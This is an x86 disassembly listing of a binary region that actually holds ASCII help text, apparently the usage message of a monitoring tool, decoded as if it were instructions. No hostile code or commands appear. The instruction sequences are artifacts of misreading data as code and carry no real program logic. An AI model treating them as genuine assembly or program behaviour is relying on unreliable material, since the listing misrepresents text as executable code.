  404bf9:	and    BYTE PTR cs:[edi+0x6e],cl
  404bfd:	ins    BYTE PTR es:[edi],dx
  404bfe:	jns    0x404c0d
  404c00:	or     ah,BYTE PTR [eax]
  404c02:	and    BYTE PTR [eax],ah
  404c04:	and    BYTE PTR [eax],ah
  404c06:	and    BYTE PTR [eax],ah
  404c08:	and    BYTE PTR [eax],ah
  404c0a:	and    BYTE PTR [eax],ah
  404c0c:	and    BYTE PTR [eax],ah
  404c0e:	and    BYTE PTR [eax],ah
  404c10:	and    BYTE PTR [eax],ah
  404c12:	and    BYTE PTR [eax],ah
  404c14:	and    BYTE PTR [eax],ah
  404c16:	and    BYTE PTR [eax],ah
  404c18:	and    BYTE PTR [eax],ah
  404c1a:	and    BYTE PTR [eax],ah
  404c1c:	and    BYTE PTR [eax],ah
  404c1e:	and    BYTE PTR [eax],ah
  404c20:	and    BYTE PTR [ebp+0x76],ah
  404c23:	outs   dx,BYTE PTR gs:[esi]
  404c25:	je     0x404c9a
  404c27:	and    BYTE PTR [eax+ebp*2+0x61],dh
  404c2b:	je     0x404c4d
  404c2d:	popa   
  404c2e:	jb     0x404c95
  404c30:	and    BYTE PTR [ebx+0x6f],ah
  404c33:	outs   dx,BYTE PTR ds:[esi]
  404c34:	jae    0x404c9f
  404c36:	fs gs jb 0x404c9f
  404c3a:	and    BYTE PTR fs:[ebp+0x72],ah
  404c3e:	jb     0x404caf
  404c40:	jb     0x404cb5
  404c42:	and    BYTE PTR [ecx+0x72],ah
  404c45:	gs or  eax,0x2020200a
  404c4b:	and    BYTE PTR [eax],ah
  404c4d:	and    BYTE PTR [eax],ah
  404c4f:	and    BYTE PTR [eax],ah
  404c51:	and    BYTE PTR [eax],ah
  404c53:	and    BYTE PTR [eax],ah
  404c55:	and    BYTE PTR [eax],ah
  404c57:	and    BYTE PTR [eax],ah
  404c59:	and    BYTE PTR [eax],ah
  404c5b:	and    BYTE PTR [eax],ah
  404c5d:	and    BYTE PTR [eax],ah
  404c5f:	and    BYTE PTR [eax],ah
  404c61:	and    BYTE PTR [eax],ah
  404c63:	and    BYTE PTR [eax],ah
  404c65:	and    BYTE PTR [eax],ah
  404c67:	and    BYTE PTR [edx+0x65],dh
  404c6a:	jo     0x404cdb
  404c6c:	jb     0x404ce2
  404c6e:	gs fs and BYTE PTR cs:[edx+0x79],al
  404c74:	and    BYTE PTR [ebp+eiz*2+0x66],ah
  404c78:	popa   
  404c79:	jne    0x404ce7
  404c7b:	je     0x404ca9
  404c7d:	and    BYTE PTR [ebx+0x73],dh
  404c80:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  404c84:	outs   dx,BYTE PTR ds:[si]
  404c86:	outs   dx,DWORD PTR ds:[esi]
  404c87:	jae    0x404cee
  404c89:	and    BYTE PTR [ebp+0x6f],ch
  404c8c:	outs   dx,BYTE PTR ds:[esi]
  404c8d:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x200a0d73
  404c95:	and    BYTE PTR [eax],ah
  404c97:	and    BYTE PTR [eax],ah
  404c99:	and    BYTE PTR [eax],ah
  404c9b:	and    BYTE PTR [eax],ah
  404c9d:	and    BYTE PTR [eax],ah
  404c9f:	and    BYTE PTR [eax],ah
  404ca1:	and    BYTE PTR [eax],ah
  404ca3:	and    BYTE PTR [eax],ah
  404ca5:	and    BYTE PTR [eax],ah
  404ca7:	and    BYTE PTR [eax],ah
  404ca9:	and    BYTE PTR [eax],ah
  404cab:	and    BYTE PTR [eax],ah
  404cad:	and    BYTE PTR [eax],ah
  404caf:	and    BYTE PTR [eax],ah
  404cb1:	and    BYTE PTR [eax],ah
  404cb3:	and    BYTE PTR [ebp+0x76],ah
  404cb6:	outs   dx,BYTE PTR gs:[esi]
  404cb8:	je     0x404d2d
  404cba:	sub    al,0x20
  404cbc:	bound  esi,QWORD PTR [ebp+0x74]
  404cbf:	and    BYTE PTR [edi+ebp*2+0x65],ah
  404cc3:	jae    0x404ce5
  404cc5:	outs   dx,BYTE PTR ds:[esi]
  404cc6:	outs   dx,DWORD PTR ds:[esi]
  404cc7:	je     0x404ce9
  404cc9:	jb     0x404d30
  404ccb:	jo     0x404d3c
  404ccd:	jb     0x404d43
  404ccf:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404cd3:	ins    DWORD PTR es:[edi],dx
  404cd4:	cs or  eax,0x2d0a0d0a
  404cda:	dec    esi
  404cdb:	inc    ebp
  404cdc:	push   edi
  404cdd:	and    BYTE PTR [eax],ah
  404cdf:	and    BYTE PTR [eax],ah
  404ce1:	and    BYTE PTR [eax],ah
  404ce3:	and    BYTE PTR [eax],ah
  404ce5:	and    BYTE PTR [eax],ah
  404ce7:	and    BYTE PTR [eax],ah
  404ce9:	and    BYTE PTR [eax],ah
  404ceb:	and    BYTE PTR [eax],ah
  404ced:	and    BYTE PTR [eax],ah
  404cef:	and    BYTE PTR [eax],ah
  404cf1:	and    BYTE PTR [eax],ah
  404cf3:	and    BYTE PTR [eax],ah
  404cf5:	and    BYTE PTR [eax],ah
  404cf7:	and    BYTE PTR [eax],ah
  404cf9:	push   edx
  404cfa:	gs jno 0x404d72
  404cfd:	gs jae 0x404d74
  404d00:	jae    0x404d22
  404d02:	jb     0x404d79
  404d04:	outs   dx,BYTE PTR ds:[esi]
  404d05:	je     0x404d70
  404d07:	ins    DWORD PTR es:[edi],dx
  404d08:	and    BYTE PTR gs:[ebp+0x6f],ch
  404d0c:	outs   dx,BYTE PTR ds:[esi]
  404d0d:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x20676e69
  404d15:	outs   dx,DWORD PTR ds:[esi]
  404d16:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  404d1b:	and    BYTE PTR [esi+0x69],ah
  404d1e:	jb     0x404d93
  404d20:	je     0x404d2f
  404d22:	or     ah,BYTE PTR [eax]
  404d24:	and    BYTE PTR [eax],ah
  404d26:	and    BYTE PTR [eax],ah
  404d28:	and    BYTE PTR [eax],ah
  404d2a:	and    BYTE PTR [eax],ah
  404d2c:	and    BYTE PTR [eax],ah
  404d2e:	and    BYTE PTR [eax],ah
  404d30:	and    BYTE PTR [eax],ah
  404d32:	and    BYTE PTR [eax],ah
  404d34:	and    BYTE PTR [eax],ah
  404d36:	and    BYTE PTR [eax],ah
  404d38:	and    BYTE PTR [eax],ah
  404d3a:	and    BYTE PTR [eax],ah
  404d3c:	and    BYTE PTR [eax],ah
  404d3e:	and    BYTE PTR [eax],ah
  404d40:	and    BYTE PTR [eax],ah
  404d42:	and    BYTE PTR [ebx+0x6f],ah
  404d45:	outs   dx,BYTE PTR ds:[esi]
  404d46:	jbe    0x404dad
  404d48:	jb     0x404dbd
  404d4a:	popa   
  404d4b:	je     0x404db6
  404d4d:	outs   dx,DWORD PTR ds:[esi]
  404d4e:	outs   dx,BYTE PTR ds:[esi]
  404d4f:	and    BYTE PTR [eax+ebp*2+0x61],dh
  404d53:	je     0x404d75
  404d55:	bound  esp,QWORD PTR [ebp+0x67]
  404d58:	imul   ebp,DWORD PTR [esi+0x73],0x74666120
  404d5f:	gs jb  0x404d82
  404d62:	jae    0x404dd7
  404d64:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  404d68:	outs   dx,BYTE PTR ds:[si]
  404d6a:	outs   dx,DWORD PTR ds:[esi]
  404d6b:	jae    0x404dd2
  404d6d:	or     eax,0x2020200a
  404d72:	and    BYTE PTR [eax],ah
  404d74:	and    BYTE PTR [eax],ah
  404d76:	and    BYTE PTR [eax],ah
  404d78:	and    BYTE PTR [eax],ah
  404d7a:	and    BYTE PTR [eax],ah
  404d7c:	and    BYTE PTR [eax],ah
  404d7e:	and    BYTE PTR [eax],ah
  404d80:	and    BYTE PTR [eax],ah
  404d82:	and    BYTE PTR [eax],ah
  404d84:	and    BYTE PTR [eax],ah
  404d86:	and    BYTE PTR [eax],ah
  404d88:	and    BYTE PTR [eax],ah
  404d8a:	and    BYTE PTR [eax],ah
  404d8c:	and    BYTE PTR [eax],ah
  404d8e:	and    BYTE PTR [ebx+0x74],dh
  404d91:	popa   
  404d92:	jb     0x404e08
  404d94:	jae    0x404dc4
  404d96:	or     eax,0x2d0a0d0a
  404d9b:	dec    ecx
  404d9c:	inc    esp
  404d9d:	and    BYTE PTR [eax],ah
  404d9f:	and    BYTE PTR [eax],ah
  404da1:	and    BYTE PTR [eax],ah
  404da3:	and    BYTE PTR [eax],ah
  404da5:	and    BYTE PTR [eax],ah
  404da7:	and    BYTE PTR [eax],ah
  404da9:	and    BYTE PTR [eax],ah
  404dab:	and    BYTE PTR [eax],ah
  404dad:	and    BYTE PTR [eax],ah
  404daf:	and    BYTE PTR [eax],ah
  404db1:	and    BYTE PTR [eax],ah
  404db3:	and    BYTE PTR [eax],ah
  404db5:	and    BYTE PTR [eax],ah
  404db7:	and    BYTE PTR [eax],ah
  404db9:	and    BYTE PTR [edx+0x65],dl
  404dbc:	jno    0x404e33
  404dbe:	gs jae 0x404e35
  404dc1:	jae    0x404de3
  404dc3:	jb     0x404e3a
  404dc5:	outs   dx,BYTE PTR ds:[esi]
  404dc6:	je     0x404e31
  404dc8:	ins    DWORD PTR es:[edi],dx
  404dc9:	and    BYTE PTR gs:[ebp+0x6f],ch
  404dcd:	outs   dx,BYTE PTR ds:[esi]
  404dce:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x20676e69
  404dd6:	outs   dx,DWORD PTR ds:[esi]
  404dd7:	data16 and BYTE PTR [eax+ebp*2+0x65],dh
  404ddc:	and    BYTE PTR [ebx+0x70],dh
  404ddf:	arpl   WORD PTR gs:[ecx+0x66],bp
  404de3:	imul   esp,DWORD PTR [ebp+0x64],0x20200a0d
  404dea:	and    BYTE PTR [eax],ah
  404dec:	and    BYTE PTR [eax],ah
  404dee:	and    BYTE PTR [eax],ah
  404df0:	and    BYTE PTR [eax],ah
  404df2:	and    BYTE PTR [eax],ah
  404df4:	and    BYTE PTR [eax],ah
  404df6:	and    BYTE PTR [eax],ah
  404df8:	and    BYTE PTR [eax],ah
  404dfa:	and    BYTE PTR [eax],ah
  404dfc:	and    BYTE PTR [eax],ah
  404dfe:	and    BYTE PTR [eax],ah
  404e00:	and    BYTE PTR [eax],ah
  404e02:	and    BYTE PTR [eax],ah
  404e04:	and    BYTE PTR [eax],ah
  404e06:	and    BYTE PTR [eax],ah
  404e08:	arpl   WORD PTR [edi+0x6e],bp
  404e0b:	jbe    0x404e72
  404e0d:	jb     0x404e82
  404e0f:	popa   
  404e10:	je     0x404e7b
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	outs   dx,BYTE PTR ds:[esi]
  404e14:	and    BYTE PTR [ebp+0x6c],ah
  404e17:	gs ins DWORD PTR es:[edi],dx
  404e19:	outs   dx,BYTE PTR gs:[esi]
  404e1b:	je     0x404e90
  404e1d:	and    BYTE PTR cs:[ecx+0x6f],bl
  404e21:	jne    0x404e43
  404e23:	arpl   WORD PTR [ecx+0x6e],sp
  404e26:	and    BYTE PTR [ebx+0x70],dh
  404e29:	arpl   WORD PTR gs:[ecx+0x66],bp
  404e2d:	jns    0x404e4f
  404e2f:	sub    eax,0xa0d4449
  404e34:	and    BYTE PTR [eax],ah
  404e36:	and    BYTE PTR [eax],ah
  404e38:	and    BYTE PTR [eax],ah
  404e3a:	and    BYTE PTR [eax],ah
  404e3c:	and    BYTE PTR [eax],ah
  404e3e:	and    BYTE PTR [eax],ah
  404e40:	and    BYTE PTR [eax],ah
  404e42:	and    BYTE PTR [eax],ah
  404e44:	and    BYTE PTR [eax],ah
  404e46:	and    BYTE PTR [eax],ah
  404e48:	and    BYTE PTR [eax],ah
  404e4a:	and    BYTE PTR [eax],ah
  404e4c:	and    BYTE PTR [eax],ah
  404e4e:	and    BYTE PTR [eax],ah
  404e50:	and    BYTE PTR [eax],ah
  404e52:	and    BYTE PTR [eax],ah
  404e54:	ins    DWORD PTR es:[edi],dx
  404e55:	jne    0x404ec3
  404e57:	je     0x404ec2
  404e59:	jo     0x404ec7
  404e5b:	and    BYTE PTR gs:[ecx+ebp*2+0x6d],dh
  404e60:	gs jae 0x404e91
  404e63:	or     eax,0x2020200a
  404e68:	and    BYTE PTR [eax],ah
  404e6a:	and    BYTE PTR [eax],ah
  404e6c:	arpl   WORD PTR [edi+0x6e],bp
  404e6f:	jbe    0x404ed6
  404e71:	jb     0x404ee6
  404e73:	popa   
  404e74:	je     0x404edf
  404e76:	outs   dx,DWORD PTR ds:[esi]
  404e77:	outs   dx,BYTE PTR ds:[esi]
  404e78:	pop    edi
  404e79:	push   0x6c646e61
  404e7e:	and    BYTE PTR gs:[eax],ah
  404e81:	and    BYTE PTR [eax],ah
  404e83:	and    BYTE PTR [eax],ah
  404e85:	inc    ecx
  404e86:	and    BYTE PTR [ebp+0x6e],dh
  404e89:	imul   esi,DWORD PTR [ecx+0x75],0x64692065
  404e90:	outs   dx,BYTE PTR gs:[esi]
  404e92:	je     0x404efd
  404e94:	imul   sp,WORD PTR [ebp+0x72],0x7420
  404e9a:	push   0x69207461
  404e9f:	fs outs dx,BYTE PTR gs:[esi]
  404ea2:	je     0x404f0d
  404ea4:	imul   sp,WORD PTR [ebp+0x73],0x6120
  404eaa:	or     eax,0x2020200a
  404eaf:	and    BYTE PTR [eax],ah
  404eb1:	and    BYTE PTR [eax],ah
  404eb3:	and    BYTE PTR [eax],ah
  404eb5:	and    BYTE PTR [eax],ah
  404eb7:	and    BYTE PTR [eax],ah
  404eb9:	and    BYTE PTR [eax],ah
  404ebb:	and    BYTE PTR [eax],ah
  404ebd:	and    BYTE PTR [eax],ah
  404ebf:	and    BYTE PTR [eax],ah
  404ec1:	and    BYTE PTR [eax],ah
  404ec3:	and    BYTE PTR [eax],ah
  404ec5:	and    BYTE PTR [eax],ah
  404ec7:	and    BYTE PTR [eax],ah
  404ec9:	and    BYTE PTR [eax],ah
  404ecb:	and    BYTE PTR [ebx+0x6f],ah
  404ece:	outs   dx,BYTE PTR ds:[esi]
  404ecf:	jbe    0x404f36
  404ed1:	jb     0x404f46
  404ed3:	popa   
  404ed4:	je     0x404f3f
  404ed6:	outs   dx,DWORD PTR ds:[esi]
  404ed7:	outs   dx,BYTE PTR ds:[esi]
  404ed8:	and    BYTE PTR [ebp+0x6e],ah
  404edb:	fs jo  0x404f4d
  404ede:	imul   ebp,DWORD PTR [esi+0x74],0x6965202c
  404ee5:	je     0x404f4f
  404ee7:	gs jb  0x404f0a
  404eea:	je     0x404f54
  404eec:	and    BYTE PTR gs:[ecx+0x6e],ch
  404ef0:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x20726f74
  404ef8:	outs   dx,DWORD PTR ds:[esi]
  404ef9:	jb     0x404f08
  404efb:	or     ah,BYTE PTR [eax]
  404efd:	and    BYTE PTR [eax],ah
  404eff:	and    BYTE PTR [eax],ah
  404f01:	and    BYTE PTR [eax],ah
  404f03:	and    BYTE PTR [eax],ah
  404f05:	and    BYTE PTR [eax],ah
  404f07:	and    BYTE PTR [eax],ah
  404f09:	and    BYTE PTR [eax],ah
  404f0b:	and    BYTE PTR [eax],ah
  404f0d:	and    BYTE PTR [eax],ah
  404f0f:	and    BYTE PTR [eax],ah
  404f11:	and    BYTE PTR [eax],ah
  404f13:	and    BYTE PTR [eax],ah
  404f15:	and    BYTE PTR [eax],ah
  404f17:	and    BYTE PTR [eax],ah
  404f19:	and    BYTE PTR [eax],ah
  404f1b:	and    BYTE PTR [ecx+eiz*2+0x72],dh
  404f1f:	addr16 gs je 0x404f43
  404f23:	outs   dx,BYTE PTR gs:[esi]
  404f25:	fs jo  0x404f97
  404f28:	imul   ebp,DWORD PTR [esi+0x74],0x200a0d2e
  404f2f:	and    BYTE PTR [eax],ah
  404f31:	and    BYTE PTR [eax],ah
  404f33:	and    BYTE PTR [eax],ah
  404f35:	arpl   WORD PTR [edi+0x6e],bp
  404f38:	jbe    0x404f9f
  404f3a:	jb     0x404faf
  404f3c:	popa   
  404f3d:	je     0x404fa8
  404f3f:	outs   dx,DWORD PTR ds:[esi]
  404f40:	outs   dx,BYTE PTR ds:[esi]
  404f41:	pop    edi
  404f42:	imul   esp,DWORD PTR [eax+eiz*1+0x20],0x20202020
  404f4a:	and    BYTE PTR [eax],ah
  404f4c:	and    BYTE PTR [eax],ah
  404f4e:	inc    ecx
  404f4f:	and    BYTE PTR [ebp+0x6e],dh
  404f52:	imul   esi,DWORD PTR [ecx+0x75],0x64692065
  404f59:	outs   dx,BYTE PTR gs:[esi]
  404f5b:	je     0x404fc6
  404f5d:	imul   sp,WORD PTR [ebp+0x72],0x7420
  404f63:	push   0x69207461
  404f68:	fs outs dx,BYTE PTR gs:[esi]
  404f6b:	je     0x404fd6
  404f6d:	imul   sp,WORD PTR [ebp+0x73],0x6120
  404f73:	or     eax,0x2020200a
  404f78:	and    BYTE PTR [eax],ah
  404f7a:	and    BYTE PTR [eax],ah
  404f7c:	and    BYTE PTR [eax],ah
  404f7e:	and    BYTE PTR [eax],ah
  404f80:	and    BYTE PTR [eax],ah
  404f82:	and    BYTE PTR [eax],ah
  404f84:	and    BYTE PTR [eax],ah
  404f86:	and    BYTE PTR [eax],ah
  404f88:	and    BYTE PTR [eax],ah
  404f8a:	and    BYTE PTR [eax],ah
  404f8c:	and    BYTE PTR [eax],ah
  404f8e:	and    BYTE PTR [eax],ah
  404f90:	and    BYTE PTR [eax],ah
  404f92:	and    BYTE PTR [eax],ah
  404f94:	and    BYTE PTR [ebx+0x6f],ah
  404f97:	outs   dx,BYTE PTR ds:[esi]
  404f98:	jbe    0x404fff
  404f9a:	jb     0x40500f
  404f9c:	popa   
  404f9d:	je     0x405008
  404f9f:	outs   dx,DWORD PTR ds:[esi]
  404fa0:	outs   dx,BYTE PTR ds:[esi]
  404fa1:	cs or  eax,0x2020200a
  404fa7:	and    BYTE PTR [eax],ah
  404fa9:	and    BYTE PTR [eax],ah
  404fab:	arpl   WORD PTR [edi+0x6e],bp
  404fae:	jbe    0x405015
  404fb0:	jb     0x405025
  404fb2:	popa   
  404fb3:	je     0x40501e
  404fb5:	outs   dx,DWORD PTR ds:[esi]
  404fb6:	outs   dx,BYTE PTR ds:[esi]
  404fb7:	pop    edi
  404fb8:	addr16 jb 0x40502a
  404fbb:	jne    0x40502d
  404fbd:	pop    edi
  404fbe:	imul   esp,DWORD PTR [eax+eiz*1+0x20],0x20412020
  404fc6:	jne    0x405036
  404fc8:	imul   esi,DWORD PTR [ecx+0x75],0x64692065
  404fcf:	outs   dx,BYTE PTR gs:[esi]
  404fd1:	je     0x40503c
  404fd3:	imul   sp,WORD PTR [ebp+0x72],0x7420
  404fd9:	push   0x69207461
  404fde:	fs outs dx,BYTE PTR gs:[esi]
  404fe1:	je     0x40504c
  404fe3:	imul   sp,WORD PTR [ebp+0x73],0x6120
  404fe9:	or     eax,0x2020200a
  404fee:	and    BYTE PTR [eax],ah
  404ff0:	and    BYTE PTR [eax],ah
  404ff2:	and    BYTE PTR [eax],ah
  404ff4:	and    BYTE PTR [eax],ah
  404ff6:	and    BYTE PTR [eax],ah
  404ff8:	and    BYTE PTR [eax],ah
  404ffa:	and    BYTE PTR [eax],ah
  404ffc:	and    BYTE PTR [eax],ah
  404ffe:	and    BYTE PTR [eax],ah
  405000:	and    BYTE PTR [eax],ah
  405002:	and    BYTE PTR [eax],ah
  405004:	and    BYTE PTR [eax],ah
  405006:	and    BYTE PTR [eax],ah
  405008:	and    BYTE PTR [eax],ah
  40500a:	and    BYTE PTR [ebx+0x6f],ah
  40500d:	outs   dx,BYTE PTR ds:[esi]
  40500e:	jbe    0x405075
  405010:	jb     0x405085
  405012:	popa   
  405013:	je     0x40507e
  405015:	outs   dx,DWORD PTR ds:[esi]
  405016:	outs   dx,BYTE PTR ds:[esi]
  405017:	and    BYTE PTR [edi+0x72],ah
  40501a:	outs   dx,DWORD PTR ds:[esi]
  40501b:	jne    0x40508d
  40501d:	and    BYTE PTR cs:[eax+ecx*2+0x65],dl
  405022:	and    BYTE PTR [ebx+0x73],dh
  405025:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  405029:	outs   dx,BYTE PTR ds:[si]
  40502b:	outs   dx,DWORD PTR ds:[esi]
  40502c:	jae    0x405093
  40502e:	and    BYTE PTR [ebp+0x74],dh
  405031:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x200a0d79
  405039:	and    BYTE PTR [eax],ah
  40503b:	and    BYTE PTR [eax],ah
  40503d:	and    BYTE PTR [eax],ah
  40503f:	and    BYTE PTR [eax],ah
  405041:	and    BYTE PTR [eax],ah
  405043:	and    BYTE PTR [eax],ah
  405045:	and    BYTE PTR [eax],ah
  405047:	and    BYTE PTR [eax],ah
  405049:	and    BYTE PTR [eax],ah
  40504b:	and    BYTE PTR [eax],ah
  40504d:	and    BYTE PTR [eax],ah
  40504f:	and    BYTE PTR [eax],ah
  405051:	and    BYTE PTR [eax],ah
  405053:	and    BYTE PTR [eax],ah
  405055:	and    BYTE PTR [eax],ah
  405057:	and    BYTE PTR [ebp+0x6f],ch
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6c612073
  405063:	ins    BYTE PTR es:[edi],dx
  405064:	and    BYTE PTR [ebx+0x6f],ah
  405067:	outs   dx,BYTE PTR ds:[esi]
  405068:	jbe    0x4050cf
  40506a:	jb     0x4050df
  40506c:	popa   
  40506d:	je     0x4050d8
  40506f:	outs   dx,DWORD PTR ds:[esi]
  405070:	outs   dx,BYTE PTR ds:[esi]
  405071:	jae    0x405093
  405073:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  40507a:	addr16 jb 0x4050ec
  40507d:	jne    0x4050ef
  40507f:	cs or  eax,0x2d0a0d0a
  405085:	push   esp
  405086:	dec    ecx
  405087:	dec    ebp
  405088:	inc    ebp
  405089:	dec    edi
  40508a:	push   ebp
  40508b:	push   esp
  40508c:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  405090:	outs   dx,DWORD PTR gs:[esi]
  405092:	jne    0x405108
  405094:	pop    edi
  405095:	imul   ebp,DWORD PTR [esi+0x74],0x61767265
  40509c:	ins    BYTE PTR es:[edi],dx
  40509d:	and    BYTE PTR [eax],ah
  40509f:	and    BYTE PTR [eax],ah
  4050a1:	and    BYTE PTR [eax],ah
  4050a3:	and    BYTE PTR [ebx+0x70],dl
  4050a6:	arpl   WORD PTR gs:[ecx+0x66],bp
  4050aa:	imul   esp,DWORD PTR [ebp+0x73],0x65687420
  4050b1:	and    BYTE PTR [esi+0x75],ch
  4050b4:	ins    DWORD PTR es:[edi],dx
  4050b5:	bound  esp,QWORD PTR [ebp+0x72]
  4050b8:	and    BYTE PTR [edi+0x66],ch
  4050bb:	and    BYTE PTR [ebx+0x65],dh
  4050be:	arpl   WORD PTR [edi+0x6e],bp
  4050c1:	fs jae 0x4050e4
  4050c4:	je     0x40512e
  4050c6:	popa   
  4050c7:	je     0x4050e9
  4050c9:	popa   
  4050ca:	and    BYTE PTR [edx+0x55],dl
  4050cd:	dec    esi
  4050ce:	push   esp
  4050cf:	dec    ecx
  4050d0:	dec    ebp
  4050d1:	inc    ebp
  4050d2:	or     eax,0x2020200a
  4050d7:	and    BYTE PTR [eax],ah
  4050d9:	and    BYTE PTR [eax],ah
  4050db:	and    BYTE PTR [eax],ah
  4050dd:	and    BYTE PTR [eax],ah
  4050df:	and    BYTE PTR [eax],ah
  4050e1:	and    BYTE PTR [eax],ah
  4050e3:	and    BYTE PTR [eax],ah
  4050e5:	and    BYTE PTR [eax],ah
  4050e7:	and    BYTE PTR [eax],ah
  4050e9:	and    BYTE PTR [eax],ah
  4050eb:	and    BYTE PTR [eax],ah
  4050ed:	and    BYTE PTR [eax],ah
  4050ef:	and    BYTE PTR [eax],ah
  4050f1:	and    BYTE PTR [eax],ah
  4050f3:	and    BYTE PTR [edx+0x65],dh
  4050f6:	jo     0x405167
  4050f8:	jb     0x40516e
  4050fa:	and    BYTE PTR [ebx+0x68],dh
  4050fd:	outs   dx,DWORD PTR ds:[esi]
  4050fe:	jne    0x40516c
  405100:	and    BYTE PTR fs:[edx+0x75],dh
  405104:	outs   dx,BYTE PTR ds:[esi]
  405105:	and    BYTE PTR cs:[ecx+0x66],cl
  405109:	and    BYTE PTR ds:0x454d4954,ch
  40510f:	dec    edi
  405110:	push   ebp
  405111:	push   esp
  405112:	and    BYTE PTR [ecx+0x73],ch
  405115:	and    BYTE PTR [esi+0x6f],ch
  405118:	je     0x40513a
  40511a:	jae    0x40518c
  40511c:	arpl   WORD PTR gs:[ecx+0x66],bp
  405120:	imul   esp,DWORD PTR [ebp+0x64],0x200a0d2c
  405127:	and    BYTE PTR [eax],ah
  405129:	and    BYTE PTR [eax],ah
  40512b:	and    BYTE PTR [eax],ah
  40512d:	and    BYTE PTR [eax],ah
  40512f:	and    BYTE PTR [eax],ah
  405131:	and    BYTE PTR [eax],ah
  405133:	and    BYTE PTR [eax],ah
  405135:	and    BYTE PTR [eax],ah
  405137:	and    BYTE PTR [eax],ah
  405139:	and    BYTE PTR [eax],ah
  40513b:	and    BYTE PTR [eax],ah
  40513d:	and    BYTE PTR [eax],ah
  40513f:	and    BYTE PTR [eax],ah
  405141:	and    BYTE PTR [eax],ah
  405143:	and    BYTE PTR [eax],ah
  405145:	and    BYTE PTR [eax+ebp*2+0x65],dh
  405149:	and    BYTE PTR [edx+0x65],dh
  40514c:	jo     0x4051bd
  40514e:	jb     0x4051c4
  405150:	and    BYTE PTR [edx+0x75],dh
  405153:	outs   dx,BYTE PTR ds:[esi]
  405154:	jae    0x405176
  405156:	imul   ebp,DWORD PTR [esi+0x64],0x6e696665
  40515d:	imul   esi,DWORD PTR [ebp+eiz*2+0x6c],0x55202e79
  405165:	jae    0x4051cc
  405167:	and    BYTE PTR [ebx+0x54],al
  40516a:	push   edx
  40516b:	dec    esp
  40516c:	sub    eax,DWORD PTR [ebx+0x20]
  40516f:	je     0x4051e0
  405171:	and    BYTE PTR ds:0x2020200a,cl
  405177:	and    BYTE PTR [eax],ah
  405179:	and    BYTE PTR [eax],ah
  40517b:	and    BYTE PTR [eax],ah
  40517d:	and    BYTE PTR [eax],ah
  40517f:	and    BYTE PTR [eax],ah
  405181:	and    BYTE PTR [eax],ah
  405183:	and    BYTE PTR [eax],ah
  405185:	and    BYTE PTR [eax],ah
  405187:	and    BYTE PTR [eax],ah
  405189:	and    BYTE PTR [eax],ah
  40518b:	and    BYTE PTR [eax],ah
  40518d:	and    BYTE PTR [eax],ah
  40518f:	and    BYTE PTR [eax],ah
  405191:	and    BYTE PTR [eax],ah
  405193:	and    BYTE PTR [ebp+0x6e],ah
  405196:	and    BYTE PTR fs:[ebx+0x73],dh
  40519a:	bound  esp,QWORD PTR [ecx+ebp*2+0x61]
  40519e:	outs   dx,BYTE PTR ds:[si]
  4051a0:	outs   dx,DWORD PTR ds:[esi]
  4051a1:	jae    0x405208
  4051a3:	and    BYTE PTR [ecx+0x66],ch
  4051a6:	and    BYTE PTR ds:0x454d4954,ch
  4051ac:	dec    edi
  4051ad:	push   ebp
  4051ae:	push   esp
  4051af:	and    BYTE PTR [ecx+0x73],ch
  4051b2:	and    BYTE PTR [esi+0x6f],ch
  4051b5:	je     0x4051d7
  4051b7:	jae    0x405229
  4051b9:	arpl   WORD PTR gs:[ecx+0x66],bp
  4051bd:	imul   esp,DWORD PTR [ebp+0x64],0x200a0d2c
  4051c4:	and    BYTE PTR [eax],ah
  4051c6:	and    BYTE PTR [eax],ah
  4051c8:	and    BYTE PTR [eax],ah
  4051ca:	and    BYTE PTR [eax],ah
  4051cc:	and    BYTE PTR [eax],ah
  4051ce:	and    BYTE PTR [eax],ah
  4051d0:	and    BYTE PTR [eax],ah
  4051d2:	and    BYTE PTR [eax],ah
  4051d4:	and    BYTE PTR [eax],ah
  4051d6:	and    BYTE PTR [eax],ah
  4051d8:	and    BYTE PTR [eax],ah
  4051da:	and    BYTE PTR [eax],ah
  4051dc:	and    BYTE PTR [eax],ah
  4051de:	and    BYTE PTR [eax],ah
  4051e0:	and    BYTE PTR [eax],ah
  4051e2:	and    BYTE PTR [ebx+0x70],dh
  4051e5:	arpl   WORD PTR gs:[ecx+0x66],bp
  4051e9:	imul   esp,DWORD PTR [ebp+0x64],0x726f202c
  4051f0:	and    BYTE PTR [ecx+0x66],ch
  4051f3:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4051f7:	and    BYTE PTR [ecx+ebp*2+0x6d],dh
  4051fb:	outs   dx,DWORD PTR gs:[esi]
  4051fd:	jne    0x405273
  4051ff:	and    BYTE PTR [ecx+0x6e],ch
  405202:	je     0x405269
  405204:	jb     0x40527c
  405206:	popa   
  405207:	ins    BYTE PTR es:[edi],dx
  405208:	and    BYTE PTR [eax+0x61],ch
  40520b:	jae    0x40522d
  40520d:	outs   dx,BYTE PTR ds:[esi]
  40520e:	outs   dx,DWORD PTR ds:[esi]
  40520f:	je     0x40521e
  405211:	or     ah,BYTE PTR [eax]
  405213:	and    BYTE PTR [eax],ah
  405215:	and    BYTE PTR [eax],ah
  405217:	and    BYTE PTR [eax],ah
  405219:	and    BYTE PTR [eax],ah
  40521b:	and    BYTE PTR [eax],ah
  40521d:	and    BYTE PTR [eax],ah
  40521f:	and    BYTE PTR [eax],ah
  405221:	and    BYTE PTR [eax],ah
  405223:	and    BYTE PTR [eax],ah
  405225:	and    BYTE PTR [eax],ah
  405227:	and    BYTE PTR [eax],ah
  405229:	and    BYTE PTR [eax],ah
  40522b:	and    BYTE PTR [eax],ah
  40522d:	and    BYTE PTR [eax],ah
  40522f:	and    BYTE PTR [eax],ah
  405231:	and    BYTE PTR [ebp+0x78],ah
  405234:	jo     0x40529f
